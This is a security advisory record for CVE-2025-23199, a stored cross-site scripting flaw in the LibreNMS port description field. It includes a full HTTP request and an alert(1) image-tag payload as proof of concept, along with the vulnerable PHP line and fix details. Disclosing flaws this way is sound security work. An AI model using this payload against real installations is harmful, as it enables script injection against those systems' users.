advisory_id: GHSA-27vf-3g4f-6jp7
datasource_id: github_osv_importer_v2/GHSA-27vf-3g4f-6jp7
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-27vf-3g4f-6jp7/GHSA-27vf-3g4f-6jp7.json
aliases:
  - CVE-2025-23199
summary: |
  LibreNMS Ports Stored Cross-site Scripting vulnerability
  # StoredXSS-LibreNMS-Ports


  **Description:**


  Stored XSS on the parameter:
  `/ajax_form.php` -> param: descr

  Request:
  ```http
  POST /ajax_form.php HTTP/1.1
  Host: <your_host>
  X-Requested-With: XMLHttpRequest
  X-CSRF-TOKEN: <your_XSRF_token>
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  Cookie: <your_cookie>

  type=update-ifalias&descr=%22%3E%3Cimg+src+onerror%3D%22alert(1)%22%3E&ifName=lo&port_id=1&device_id=1
  ```


  of Librenms version 24.10.1 ([https://github.com/librenms/librenms](https://github.com/librenms/librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.



  **Proof of Concept:**
  1. Add a new device through the LibreNMS interface.
  2. Edit the newly created device and select the "ports" section.
  3. In the "Description" field, enter the following payload: `"><img src onerror="alert(1)">`.
  4. Save the changes.
  5. The XSS vulnerability is triggered when accessing the "ports" tab, and the payload is executed again when hovering over the modified value in the "Port" field.

  Payload:
  ![payload](https://github.com/user-attachments/assets/2f38b985-6684-403f-9d1f-e405f09a75bb)

  Executes:
  ![image](https://github.com/user-attachments/assets/b70a6e34-d52c-4113-b769-4e271e33de88)
  The script execution vulnerability in the description field, as shown in the image, occurs at [Line 63 of functions.inc.php](https://github.com/librenms/librenms/blob/master/includes/html/functions.inc.php#L63)
  ```php
  $overlib_content = '<div class=overlib><span class=overlib-text>' . $text . '</span><br />';
  ```

  ![image](https://github.com/user-attachments/assets/97b85403-5b7e-4f43-932c-d33bd3c0f73f)




  **Impact:**

  Execution of Malicious Code
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<24.10.1
    fixed_versions: vers:composer/24.11.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '4.6'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-27vf-3g4f-6jp7/GHSA-27vf-3g4f-6jp7.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/9d07d166b87634091dcf21c62b28f9b42a3118c4
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/pull/16721
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-27vf-3g4f-6jp7
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-23199
    reference_type:
    reference_id: CVE-2025-23199
